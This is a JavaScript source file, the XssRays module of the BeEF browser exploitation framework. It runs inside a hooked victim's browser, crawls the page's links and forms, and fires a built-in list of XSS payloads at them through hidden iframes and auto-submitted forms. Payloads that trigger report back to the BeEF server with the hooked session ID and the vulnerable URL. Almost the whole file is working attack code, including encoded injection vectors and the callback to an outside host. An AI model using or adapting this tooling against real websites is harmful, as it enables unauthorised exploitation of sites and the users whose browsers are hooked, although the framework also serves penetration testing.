/*
 * XSS Rays
 * Legal bit:
 * Do not remove this notice.
 * Copyright (c) 2009 by Gareth Heyes
 * Programmed for Microsoft
 * gareth --at-- businessinfo -dot- co |dot| uk
 * Version 0.5.5
 *
 * This license governs use of the accompanying software. If you use the software, you
 * accept this license. If you do not accept the license, do not use the software.
 * 1. Definitions
 * The terms "reproduce," "reproduction," "derivative works," and "distribution" have the
 * same meaning here as under U.S. copyright law.
 * A "contribution" is the original software, or any additions or changes to the software.
 * A "contributor" is any person that distributes its contribution under this license.
 * "Licensed patents" are a contributor's patent claims that read directly on its contribution.
 * 2. Grant of Rights
 * (A) Copyright Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free copyright license to reproduce its contribution, prepare derivative works of its contribution, and distribute its contribution or any derivative works that you create.
 * (B) Patent Grant- Subject to the terms of this license, including the license conditions and limitations in section 3, each contributor grants you a non-exclusive, worldwide, royalty-free license under its licensed patents to make, have made, use, sell, offer for sale, import, and/or otherwise dispose of its contribution in the software or derivative works of the contribution in the software.
 * 3. Conditions and Limitations
 * (A) No Trademark License- This license does not grant you rights to use any contributors' name, logo, or trademarks.
 * (B) If you bring a patent claim against any contributor over patents that you claim are infringed by the software, your patent license from such contributor to the software ends automatically.
 * (C) If you distribute any portion of the software, you must retain all copyright, patent, trademark, and attribution notices that are present in the software.
 * (D) If you distribute any portion of the software in source code form, you may do so only under this license by including a complete copy of this license with your distribution. If you distribute any portion of the software in compiled or object code form, you may only do so under a license that complies with this license.
 * (E) The software is licensed "as-is." You bear the risk of using it. The contributors give no express warranties, guarantees or conditions. You may have additional consumer rights under your local laws which this license cannot change. To the extent permitted under your local laws, the contributors exclude the implied warranties of merchantability, fitness for a particular purpose and non-infringement.
 */

/*
 * XssRays 0.5.5 ported to BeEF by Michele "antisnatchor" Orru'
 * The XSS detection mechanisms has been rewritten from scratch: instead of using the location hash trick (that doesn't work anymore),
 * if the vulnerability is triggered the JS code vector will contact back BeEF.
 * Other aspects of the original code have been simplified and improved.
 */
beef.net.xssrays = {
    handler: "xssrays",
    completed:0,
    totalConnections:0,

    // BeEF variables
    xssraysScanId : 0,
    hookedBrowserSession: "",
    beefRayUrl: "",
    // the 3 following variables are overridden via BeEF, in the Scan Config XssRays sub-tab. 
    crossDomain: false,
    debug:false,
    cleanUpTimeout:5000,

    //browser-specific attack vectors available strings: ALL, FF, IE, S, C, O
    vectors: [

				  {input:"\',XSS,\'", name: 'Standard DOM based injection single quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'",XSS,"', name: 'Standard DOM based injection double quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'\'"><script>XSS<\/script>', name: 'Standard script injection', browser: 'ALL',url:true,form:true,path:true},
				  {input:'\'"><body onload="XSS">', name: 'body onload', browser: 'ALL',url:true,form:true,path:true},
				  {input:'%27%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'%22%3E%3C%73%63%72%69%70%74%3EXSS%3C%2F%73%63%72%69%70%74%3E', name: 'url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'%25%32%37%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded single quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'%25%32%32%25%33%45%25%33%43%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45XSS%25%33%43%25%32%46%25%37%33%25%36%33%25%37%32%25%36%39%25%37%30%25%37%34%25%33%45', name: 'double url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'%%32%35%%33%32%%33%32%%32%35%%33%33%%34%35%%32%35%%33%33%%34%33%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35XSS%%32%35%%33%33%%34%33%%32%35%%33%32%%34%36%%32%35%%33%37%%33%33%%32%35%%33%36%%33%33%%32%35%%33%37%%33%32%%32%35%%33%36%%33%39%%32%35%%33%37%%33%30%%32%35%%33%37%%33%34%%32%35%%33%33%%34%35', name: 'double nibble url encoded double quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:"' style=abc:expression(XSS) ' \" style=abc:expression(XSS) \"", name: 'Expression CSS based injection', browser: 'IE',url:true,form:true,path:true},
				  {input:'" type=image src=null onerror=XSS " \' type=image src=null onerror=XSS \'', name: 'Image input overwrite based injection', browser: 'ALL',url:true,form:true,path:true},
				  {input:"' onload='XSS' \" onload=\"XSS\"/onload=\"XSS\"/onload='XSS'/", name: 'onload event injection', browser: 'ALL',url:true,form:true,path:true},
				  {input:'\'\"<\/script><\/xml><\/title><\/textarea><\/noscript><\/style><\/listing><\/xmp><\/pre><img src=null onerror=XSS>', name: 'Image injection HTML breaker', browser: 'ALL',url:true,form:true,path:true},
				  {input:"'},XSS,function x(){//", name: 'DOM based function breaker single quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'"},XSS,function x(){//', name: 'DOM based function breaker double quote', browser: 'ALL',url:true,form:true,path:true},
				  {input:'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3eXSS\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', name: 'DOM based innerHTML injection', browser: 'ALL',url:true,form:true,path:true},
  				  {input:'javascript:XSS', name: 'Javascript protocol injection', browser: 'ALL',url:true,form:true,path:true},
  				  {input:'null,XSS//', name: 'Unfiltered DOM injection comma', browser: 'ALL',url:true,form:true,path:true},
				  {input:'null\nXSS//', name: 'Unfiltered DOM injection new line', browser: 'ALL',url:true,form:true,path:true}
    ],
    uniqueID: 0,
    rays: [],
    stack: [],

    // return true is the attack vector can be launched to the current browser type.
    checkBrowser:function(vector_array_index){
        var result = false;
        var browser_id = this.vectors[vector_array_index].browser;
        switch (browser_id){
        case "ALL":
            result = true;
            break;
        case "FF":
            if(beef.browser.isFF())result=true;
            break;
        case "IE":
            if(beef.browser.isIE())result=true;
            break;
        case "C":
            if(beef.browser.isC())result=true;
            break;
        case "S":
            if(beef.browser.isS())result=true;
            break;
        case "O":
            if(beef.browser.isO())result=true;
            break;
        default : result = false;
        }
        beef.net.xssrays.printDebug("==== browser_id ==== [" + browser_id + "], result [" + result + "]");
        return result;
    },

    // util function. Print string to the console only if the debug flag is on and the browser is not IE.
    printDebug:function(log) {
        if (this.debug && (!beef.browser.isIE6() && !beef.browser.isIE7() && !beef.browser.isIE8())) {
            beef.debug("[XssRays] " + log);
        }
    },

    // main function, where all starts :-)
    startScan:function(xssraysScanId, hookedBrowserSession, beefUrl, crossDomain, timeout, debug) {

        this.xssraysScanId = xssraysScanId;
        this.hookedBrowserSession = hookedBrowserSession;
        this.beefRayUrl = beefUrl + '/' + this.handler;
        beef.net.xssrays.printDebug("Using [" + this.beefRayUrl  + "] handler to contact back BeEF");
        this.crossDomain = crossDomain;
        this.cleanUpTimeout = timeout;
        this.debug = debug;

        this.scan();
        beef.net.xssrays.printDebug("Starting scan");
        this.runJobs();
    },
    complete:function() {
        if (beef.net.xssrays.completed == beef.net.xssrays.totalConnections) {
            beef.net.xssrays.printDebug("COMPLETE, notifying BeEF for scan id [" + beef.net.xssrays.xssraysScanId + "]");
            $j.get(this.beefRayUrl, { hbsess: this.hookedBrowserSession, raysid: this.xssraysScanId, action: "finish"} );
        } else {
            this.getNextJob();
        }
    },
    getNextJob:function() {
        var that = this;
        beef.net.xssrays.printDebug("getNextJob - this.stack.length [" + this.stack.length + "]");
        if (this.stack.length > 0) {
            var func = that.stack.shift();
            if (func) {
                that.completed++;
                func.call(that);
            }
        }else{ //nothing else to scan
            this.complete();
        }
    },
    scan:function() {
        this.scanLinks();
        this.scanForms();
    },
    scanPaths:function() {
        this.xss({type:'path'});
        return this;
    },
    scanForms: function() {
        this.xss({type:'form'});
        return this;
    },
    scanLinks: function() { //TODO: add depth crawling for links that are in the same domain
        beef.net.xssrays.printDebug("scanLinks, document.links.length [" + document.links.length + "]");
        for (var i = 0; i < document.links.length; i++) {
            var url = document.links[i];

            if ((url.hostname.toString() === location.hostname.toString() || this.crossDomain) && (location.protocol === 'http:' || location.protocol === 'https:')) {
                beef.net.xssrays.printDebug("Starting scanning URL [" + url + "]\n url.href => " + url.href +
                    "\n url.pathname => " + url.pathname + "\n" +
                    "url.search => " + url.search + "\n");
                this.xss({href:url.href, pathname:url.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,
                    search:url.search, type: 'url'});//scan each link & param
            } else {
                if (this.debug) {
                    beef.net.xssrays.printDebug('Scan is not Cross-domain.  URLS\nurl :' + url.hostname.toString());
                    beef.net.xssrays.printDebug('\nlocation :' + location.hostname.toString());
                }
            }
        }
        if (location.search.length > 0) {
            this.xss({pathname:location.pathname, hostname:url.hostname, port: url.port, protocol: location.protocol,search:location.search, type: 'url'});//scan originating url
        }
        return this;
    },
    xss:function(target) {
        switch (target.type) {
            case "url":
                if (target.search.length > 0) {
                    target.search = target.search.slice(1);
                    target.search = target.search.split(/&|&amp;/);

                    if(beef.browser.isIE() && target.pathname.charAt(0) != "/"){ //the damn IE doesn't contain the forward slash in pathname
                       var pathname = "/" + target.pathname;
                    }else{
                        var pathname = target.pathname;
                    }

                    var params = {};
                    for (var i = 0; i < target.search.length; i++) {
                        target.search[i] = target.search[i].split('=');
                        params[target.search[i][0]] = target.search[i][1];
                    }
                    for (var i = 0; i < this.vectors.length; i++) {
                        // skip the current vector if it's not compatible with the hooked browser
                        if (!this.checkBrowser(i)){
                            beef.net.xssrays.printDebug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                            continue;
                        }
                        if (!this.vectors[i].url) {
                            continue;
                        }
                        if (this.vectors[i].url) {
                            if (target.port == null || target.port == "") {
                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], params, true);//params
                            } else {
                                beef.net.xssrays.printDebug("Starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], params, true);//params
                            }
                        }
                        if (this.vectors[i].path) {
                            if (target.port == null || target.port == "") {
                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + pathname + "]");
                                this.run(target.protocol + '//' + target.hostname + pathname, 'GET', this.vectors[i], null, true);//paths
                            } else {
                                beef.net.xssrays.printDebug("Starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' + target.port + pathname + "]");
                                this.run(target.protocol + '//' + target.hostname + ':' + target.port + pathname, 'GET', this.vectors[i], null, true);//paths
                            }
                        }
                    }
                }
                break;
            case "form":
                var params = {};
                var paramsstring = "";
                for (var i = 0; i < document.forms.length; i++) {
                    var action = document.forms[i].action || document.location;
                    var method = document.forms[i].method.toUpperCase() === 'POST' ?
                        'POST' :
                        'GET';

                    for (var j = 0; j < document.forms[i].elements.length; j++) {
                        params[document.forms[i].elements[j].name] = document.forms[i].elements[j].value || 1;
                    }
                    for (var k = 0; k < this.vectors.length; k++) {

                        // skip the current vector if it's not compatible with the hooked browser
                        if (!this.checkBrowser(k)){
                            beef.net.xssrays.printDebug("Skipping vector [" + this.vectors[i].name + "] because it's not compatible with the current browser.");
                            continue;
                        }
                        if (!this.vectors[k].form) {
                            continue;
                        }
                        if (!this.crossDomain && (this.host(action).toString() != this.host(location.toString()))) {
                            if (this.debug) {
                                beef.net.xssrays.printDebug('Scan is not Cross-domain. FormPost\naction :' + this.host(action).toString());
                                beef.net.xssrays.printDebug('location :' + this.host(location));
                            }
                            continue;
                        }
                        if (this.vectors[k].form) {
                            if (method === 'GET') {
                                beef.net.xssrays.printDebug("Starting XSS on FORM action params, GET method of [" + action + "], params [" + paramsstring + "]");
                                this.run(action, method, this.vectors[k], params, true);//params
                            }
                            else {
                                beef.net.xssrays.printDebug("Starting XSS on FORM action params, POST method of [" + action + "], params [" + paramsstring + "]");
                                this.run(action, method, this.vectors[k], params, false);//params
                            }
                        }
                        if (this.vectors[k].path) {
                            beef.net.xssrays.printDebug("Starting XSS on FORM action URI PATH of [" + action + "], ");
                            this.run(action, 'GET', this.vectors[k], null, true);//paths
                        }
                    }
                }
                break;
        }
    },
    host: function(url) {
        var host = url;
        host = /^https?:[\/]{2}[^\/]+/.test(url.toString())
            ? url.toString().match(/^https?:[\/]{2}[^\/]+/)
            : /(?:^[^a-zA-Z0-9\/]|^[a-zA-Z0-9]+[:]+)/.test(url.toString())
            ? ''
            : location.hostname.toString();
        return host;
    },
    fileName: function(url) {
        return url.match(/(?:^[^\/]|^https?:[\/]{2}|^[\/]+)[^?]+/) || '';
    },

    urlEncode: function(str) {
        str = str.toString();
        str = str.replace(/"/g, '%22');
        str = str.replace(/&/g, '%26');
        str = str.replace(/\+/g, '%2b');
        return str;
    },

    // this is the main core function with the detection mechanisms...
    run: function(url, method, vector, params, urlencode) {
        this.stack.push(function() {

            //check if the URL end with / . In this case remove the last /, as it will be added later.
            // this check is needed only when checking for URI path injections
            if(url[url.length - 1] == "/" && params == null){
               url = url.substring(0, url.length - 2);
               beef.net.xssrays.printDebug("Remove last / from url. New url [" + url + "]");
            }

            beef.net.xssrays.uniqueID++;
            beef.net.xssrays.printDebug('Processing vector [' + vector.name + "], URL [" + url + "]");
            var poc = '';
            var pocurl = url;
            var exploit = '';
            var action = url;


            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
            var ray = this.rays[beef.net.xssrays.uniqueID];

            var paramsPos = 0;
            if (params != null) {
                /*
                 * ++++++++++ check for XSS in URI parameters (GET) ++++++++++
                 */
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                        if (!/[?]/.test(url)) {
                            url += '?';
                            pocurl += '?';
                        }

                        poc = vector.input.replace(/XSS/g, "alert(1)");
                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc) + '&';

                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                        beefCallback = "location='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                        exploit = vector.input.replace(/XSS/g, beefCallback);

                        if(beef.browser.isC() || beef.browser.isS()){ //we will base64 the whole uri later
                            url += i + '=' + exploit + '&';
                        }else{
                            url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
                        }

                        paramsPos++;
                    }
                }
            } else {
                /*
                 * ++++++++++ check for XSS in URI path (GET) ++++++++++
                 */
                var filename = beef.net.xssrays.fileName(url);

                poc = vector.input.replace(/XSS/g, "alert(1)");
                pocurl = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');


                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
                    + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                exploit = vector.input.replace(/XSS/g, beefCallback);

                //TODO: if the url is something like example.com/?param=1 then a second slash will be added, like example.com//<xss>.
                //TODO: this need to checked and the slash shouldn't be added in this particular case
                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
            }
            /*
             * ++++++++++ create the iFrame that will contain the attack vector ++++++++++
             */
            if(beef.browser.isIE()){
                try {
                    var iframe = document.createElement('<iframe name="ray'+Math.random().toString() +'">');
                } catch (e) {
                    var iframe = document.createElement('iframe');
                    iframe.name = 'ray' + Math.random().toString();
                }
            }else{
                var iframe = document.createElement('iframe');
                iframe.name = 'ray' + Math.random().toString();
            }
            iframe.style.display = 'none';
            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
            iframe.time = beef.net.xssrays.timestamp();

            if (method === 'GET') {
                if(beef.browser.isC() || beef.browser.isS()){
                    var datauri = btoa(url);
                    iframe.src = "data:text/html;base64," + datauri;
                }else{
                    iframe.src = url;
                }
                document.body.appendChild(iframe);
                beef.net.xssrays.printDebug("Creating XSS iFrame with src [" + iframe.src + "], id[" + iframe.id + "], time [" + iframe.time + "]");
            } else if (method === 'POST') {
                /*
                 * ++++++++++ check for XSS in body parameters (POST) ++++++++++
                 */
                var form = '<form action="' + beef.net.xssrays.escape(action) + '" method="post" id="frm">';
                poc = '';
                pocurl = action + "?";
                paramsPos = 0;

                beef.net.xssrays.printDebug("Form action [" + action + "]");
                for (var i in params) {
                    if (params.hasOwnProperty(i)) {

                        poc = vector.input.replace(/XSS/g, "alert(1)");
                        poc = poc.replace(/<\/script>/g, "<\/scr\"+\"ipt>");
                        pocurl += i + '=' + (urlencode ? encodeURIComponent(poc) : poc); // + '&';

                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = pocurl;
                        beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;

                        beefCallback = "document.location.href='" + this.beefRayUrl + "?hbsess=" + this.hookedBrowserSession + "&raysid=" + this.xssraysScanId
                            + "&action=ray" + "&p='+window.location.href+'&n=" + ray.vector.name + "&m=" + ray.vector.method + "'";

                        exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, beefCallback));
                        form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
                        beef.net.xssrays.printDebug("form param[" + i + "] = " + params[i].toString());

                        paramsPos++;
                    }
                }
                form += '<\/form>';
                document.body.appendChild(iframe);
                beef.net.xssrays.printDebug("Creating form [" + form + "]");
                iframe.contentWindow.document.writeln(form);
                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
                beef.net.xssrays.printDebug("Submitting form");
            }

        });
    },

    // run the jobs (run functions added to the stack), and clean the shit (iframes) from the DOM after a timeout value
    runJobs: function() {
        var that = this;
        this.totalConnections = this.stack.length;
        that.getNextJob();
        setInterval(function() {
            var numOfConnections = 0;
            for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                var iframe = document.getElementsByTagName('iframe')[i];
                numOfConnections++;
                //beef.net.xssrays.printDebug("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                    try{
                        if (iframe) {
                            beef.net.xssrays.complete();
                            beef.net.xssrays.printDebug("RunJobs cleaning up iFrame [" + iframe.id + "]");
                            document.body.removeChild(iframe);
                        }
                    }catch(e){beef.net.xssrays.printDebug("Exception [" + e.toString() + "] when cleaning iframes.")}
                }
            }

            if (numOfConnections == 0) {
                clearTimeout(this);
            }

        }, this.cleanUpTimeout);

        return this;
    },
    timestamp: function() {
        return parseInt(new Date().getTime().toString().substring(0, 10));
    },
    escape: function(str) {
        str = str.toString();
        str = str.replace(/</g, '&lt;');
        str = str.replace(/>/g, '&gt;');
        str = str.replace(/\u0022/g, '&quot;');
        str = str.replace(/\u0027/g, '&#39;');
        str = str.replace(/\\/g, '&#92;');
        return str;
    }

};

beef.regCmp('beef.net.xssrays');
